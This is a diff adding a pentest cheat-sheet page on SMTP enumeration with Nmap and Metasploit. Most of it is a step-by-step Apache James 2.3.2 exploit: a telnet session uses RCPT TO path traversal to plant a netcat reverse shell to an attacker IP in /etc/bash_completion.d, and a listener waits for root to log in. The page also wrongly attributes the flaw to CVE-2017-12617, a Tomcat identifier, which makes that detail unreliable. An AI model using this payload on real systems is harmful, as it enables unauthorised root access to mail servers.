@@ -1,0 +1,128 @@
+---
+title: SMTP Enumeration & Exploitation
+description: Enumerating SMTP servers to find valid users and exploiting misconfigurations like Apache James RCE.
+draft: false
+tags:
+  - SMTP
+  - Reconnaissance
+  - Exploitation
+  - T1110
+---
+
+<Callout type="info" title="Concept Overview">
+**Simple Mail Transfer Protocol (SMTP)** operates on **TCP port 25**. It is used for sending emails. Misconfigured SMTP servers can leak valid usernames, act as open relays for spam, or in severe cases (like outdated Apache James servers), allow arbitrary file writes leading to Remote Code Execution (RCE).
+</Callout>
+
+!["bh"](/docs/Asset/bh.jpg)
+
+```mermaid
+%%{init: {'theme': 'base', 'themeVariables': { 'background': '#050505', 'primaryColor': '#111118', 'edgeLabelBackground':'#050505', 'primaryTextColor': '#ffffff', 'primaryBorderColor': '#FF003C', 'lineColor': '#FF003C', 'fontFamily': 'monospace' }}}%%
+flowchart TD
+    A["SMTP Port 25 Open"] --> B["Nmap / MSF Enum"]
+    B --> C["User Enumeration"]
+    C --> D{"Apache James 2.3.2?"}
+    D -- Yes --> E["Path Traversal via RCPT TO"]
+    E --> F["Write Payload to /etc/bash_completion.d/"]
+    F --> G["Wait for Root Login"]
+    G --> H["Root Shell!"]
+    
+    classDef default fill:#111118,stroke:#585b70,stroke-width:1px,color:#ffffff;
+    classDef attacker fill:#2a0008,stroke:#FF003C,stroke-width:2px,color:#FF003C;
+    classDef action fill:#1a1a1a,stroke:#89b4fa,stroke-width:2px,color:#89b4fa;
+    classDef exec fill:#1a1a1a,stroke:#D500F9,stroke-width:2px,color:#D500F9;
+    
+    class A,B,C action;
+    class D attacker;
+    class E,F action;
+    class G,H exec;
+```
+
+---
+
+## Nmap Scanning
+
+<AccordionGroup>
+  <Accordion title="Nmap NSE Scripts for SMTP">
+    Use Nmap to enumerate users, check for open relays, and list supported SMTP commands.
+    ```bash
+    # Enumerate valid users (using VRFY, EXPN, or RCPT)
+    nmap -p 25 --script smtp-enum-users x.x.x.x
+
+    # Check if the server is an open relay
+    nmap -p 25 --script smtp-open-relay x.x.x.x
+
+    # List supported SMTP commands (EHLO)
+    nmap -p 25 --script smtp-commands x.x.x.x
+    ```
+  </Accordion>
+</AccordionGroup>
+
+---
+
+## Metasploit Enumeration
+
+<Callout type="tip" title="MSFconsole SMTP Enum">
+Automate username brute-forcing using built-in wordlists.
+</Callout>
+
+<AccordionGroup>
+  <Accordion title="Metasploit Commands">
+    ```ruby
+    msfconsole
+    msf6> use auxiliary/scanner/smtp/smtp_enum
+    msf6> set RHOSTS x.x.x.x
+    msf6> exploit
+    ```
+  </Accordion>
+</AccordionGroup>
+
+---
+
+## Manual Exploitation: Apache James 2.3.2 RCE
+
+<Callout type="danger" title="Arbitrary File Write via SMTP (CVE-2017-12617)">
+Older versions of Apache James (like 2.3.2) allow unauthenticated users to write arbitrary files to the filesystem by using path traversal in the `RCPT TO` field. By writing a reverse shell payload to `/etc/bash_completion.d/`, it will be executed automatically when a user (like root) logs into the system via bash.
+</Callout>
+
+<Steps>
+  <Step title="Step 1: Connect via Telnet">
+    ```bash
+    telnet example.com 25
+    ```
+  </Step>
+  <Step title="Step 2: Execute the Exploit Payload">
+    Type the following commands carefully into the Telnet prompt. Replace `10.10.14.12 1234` with your attacker IP and listener port.
+    <AccordionGroup>
+      <Accordion title="Telnet Commands">
+        ```text
+        EHLO example.com
+
+        MAIL FROM: <user.family@example.com>
+
+        RCPT TO: <../../../../../../../../etc/bash_completion.d>
+
+        DATA
+        FROM: user.family.example.com
+
+        /bin/nc -e /bin/bash 10.10.14.12 1234
+        .
+        quit
+        ```
+      </Accordion>
+    </AccordionGroup>
+  </Step>
+  <Step title="Step 3: Start a Netcat Listener">
+    Wait for an administrator to log in to the target system. When they do, `bash_completion.d` triggers your payload.
+    ```bash
+    nc -lvnp 1234
+    ```
+  </Step>
+</Steps>
+
+<Callout type="warning" title="Telnet Command Breakdown">
+* `EHLO`: Greets the server and requests extended SMTP commands.
+* `MAIL FROM`: Defines the sender (can be spoofed).
+* `RCPT TO`: Defines the recipient. Here, we use `../` to traverse out of the default mail directory and target the system's bash completion directory.
+* `DATA`: Starts the email body where the malicious payload is placed.
+* `.` (Dot): Signals the end of the email data and tells the server to process the message.
+</Callout>
